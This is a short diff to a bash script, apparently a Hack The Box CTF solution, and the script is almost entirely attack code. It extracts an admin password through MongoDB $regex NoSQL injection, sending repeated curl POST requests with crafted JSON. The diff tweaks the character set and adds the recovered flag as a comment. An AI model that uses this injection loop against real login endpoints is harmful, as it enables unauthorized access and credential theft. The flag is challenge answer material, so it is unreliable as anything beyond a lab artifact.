@@ -6,7 +6,7 @@ x="HTB{th3_4l13ns_h4v3nt_us3d_m0n"
 
 while true; do
     found=false
-    for char in {a..z} {A..Z} {0..9} '!' '#' '$' '%' '&' '(' ')' ',' '-' '/' ':' ';' '<' '=' '>' '@' '[' '\' ']' '^' '_' '`' '{' '}' '~'; do
+    for char in {a..z} {A..Z} {0..9} '!' '#' '%' '&' '(' ')' ',' '-' '/' ':' ';' '<' '=' '>' '@' '[' '\' ']' '^' '_' '`' '{' '}' '~'; do
         data="{\"username\":\"admin\", \"password\":{\"\$regex\":\"${x}${char}.*\"}}"
         response=$(curl -s -X POST -H "Content-Type: application/json" -d "$data" "$target")
         #echo $data
@@ -25,3 +25,4 @@ done
 
 echo "Final result: $x"
 
+#HTB{th3_4l13ns_h4v3nt_us3d_m0ng0db_I_gu3ss!}
